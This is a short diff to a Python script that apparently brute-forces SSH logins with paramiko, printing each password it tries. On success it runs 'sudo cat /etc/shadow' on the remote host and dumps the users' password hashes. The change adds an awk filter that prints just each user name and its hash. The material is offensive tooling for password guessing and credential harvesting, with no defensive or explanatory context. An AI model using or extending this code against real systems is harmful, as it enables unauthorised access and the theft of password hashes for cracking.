@@ -22,7 +22,7 @@ import paramiko # for SSH connections and remote execution
 
 # SSH connect to <host> on <port> using <username>:<pw>
 def connect_ssh(host, username, pw, port=22):
-    print(f"[{username}@{host}] Trying password '{pw}':\t", end="")
+    print(f"[{username}@{host}] Trying password '{pw}':   ", end="")
     
     # set up an SSH client object
     ssushi = paramiko.SSHClient()
@@ -98,7 +98,7 @@ while True:
                   try:
                       print("\nDUMPING USER PW HASHES FROM /etc/shadow:")
                       # execute remote command to grab pw hashes
-                      ssh_in, ssh_out, ssh_err = ssh.exec_command('sudo cat /etc/shadow | grep -v -e "*" -e "!"')
+                      ssh_in, ssh_out, ssh_err = ssh.exec_command("sudo cat /etc/shadow | grep -v -e '*' -e '!' | awk -F ':' '{ print $1 \"\t\"  $2 }'")
                       print(ssh_out.read().decode("ASCII")) # decode as ASCII and dump to stdout
                       print("^^^ END OF HASHES ^^^")
                   
